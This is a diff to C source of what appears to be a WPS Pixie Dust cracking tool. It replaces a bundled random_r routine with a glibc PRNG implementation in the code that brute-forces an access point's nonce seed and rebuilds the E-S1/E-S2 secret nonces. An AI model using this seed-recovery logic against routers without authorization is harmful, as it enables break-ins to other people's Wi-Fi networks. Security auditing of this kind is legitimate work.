@@ -39,8 +39,10 @@
 #include "crypto/aes-cbc.c"
 #include "utils.h"
 #include "wps.h"
-#include "random_r.c"
 #include "version.h"
+
+#define GLIBC_MAX_GEN 4
+#include "glibc_random.c"
 
 uint32_t ecos_rand_simplest(uint32_t *seed);
 uint32_t ecos_rand_simple(uint32_t *seed);
@@ -90,25 +92,21 @@ static struct job_control {
 } job_control;
 
 static void *crack_thread(void *arg) {
+	struct glibc_prng glibc_prng;
 	struct crack_job *j = arg;
-	struct m_random_data buf = {0};
-	char rand_statebuf[128] = {0};
-
 	uint32_t seed = j->start;
 	uint32_t limit = job_control.end;
-	m_initstate_r(seed, rand_statebuf, &buf);
-	int32_t res = 0;
 
 	while (!job_control.nonce_seed) {
-		m_srandom_r(seed, &buf);
 		unsigned int i;
-		for (i = 0; i < 4; i++) {
-			m_random_r(&buf, &res);
-			if ((uint32_t) res != job_control.randr_enonce[i])
+		glibc_seed(&glibc_prng, seed);
+		for (i = 0; i < GLIBC_FAST_MAX_GEN; i++) {
+			const unsigned int res = glibc_rand_fast(&glibc_prng);
+			if (res != job_control.randr_enonce[i])
 				break;
 		}
 
-		if (i == 4) {
+		if (i == GLIBC_FAST_MAX_GEN) {
 			job_control.nonce_seed = seed;
 			DEBUG_PRINT("Seed found %u", seed);
 		}
@@ -893,9 +891,7 @@ usage_err:
 
 						nonce_seed = collect_crack_jobs();
 
-						struct m_random_data *buf = calloc(1, sizeof(struct m_random_data));
-						char *rand_statebuf = calloc(1, 128);
-						m_initstate_r(nonce_seed, rand_statebuf, buf);
+						struct glibc_prng glibc_prng;
 
 						if (nonce_seed) { /* Seed found */
 							int32_t res;
@@ -906,11 +902,10 @@ usage_err:
 
 							do {
 								i++;
-								m_srandom_r(nonce_seed + i, buf);
-								for (uint_fast8_t j = 0; j < 4; j++) {
-									m_random_r(buf, &res);
-									uint32_t be = h32_to_be(res);
-									memcpy(&(wps->e_s1[4 * j]), &be, 4);
+								glibc_seed(&glibc_prng, nonce_seed + i);
+								for (uint_fast8_t j = 0; j < GLIBC_MAX_GEN; j++) {
+									uint32_t be = h32_to_be(glibc_rand(&glibc_prng));
+									memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
 									memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN);        /* E-S1 = E-S2 != E-Nonce */
 								}
 								s1_seed = nonce_seed + i;
@@ -959,11 +954,10 @@ usage_err:
 								i = 0;
 								do {
 									i++;
-									m_srandom_r(nonce_seed - i, buf);
-									for (uint_fast8_t j = 0; j < 4; j++) {
-										m_random_r(buf, &res);
-										uint32_t be = h32_to_be(res);
-										memcpy(&(wps->e_s1[4 * j]), &be, 4);
+									glibc_seed(&glibc_prng, nonce_seed - i);
+									for (uint_fast8_t j = 0; j < GLIBC_MAX_GEN; j++) {
+										uint32_t be = h32_to_be(glibc_rand(&glibc_prng));
+										memcpy(&(wps->e_s1[4 * j]), &be, sizeof(uint32_t));
 										memcpy(wps->e_s2, wps->e_s1, WPS_SECRET_NONCE_LEN);        /* E-S1 = E-S2 != E-Nonce */
 									}
 									s1_seed = nonce_seed - i;
@@ -1016,9 +1010,6 @@ usage_err:
 								snprintf(wps->warning, 256, " [!] The AP /might be/ vulnerable. Try again with --force or with another (newer) set of data.\n\n");
 							}
 						}
-
-						free(buf);
-						free(rand_statebuf);
 					}
 				}
 			}
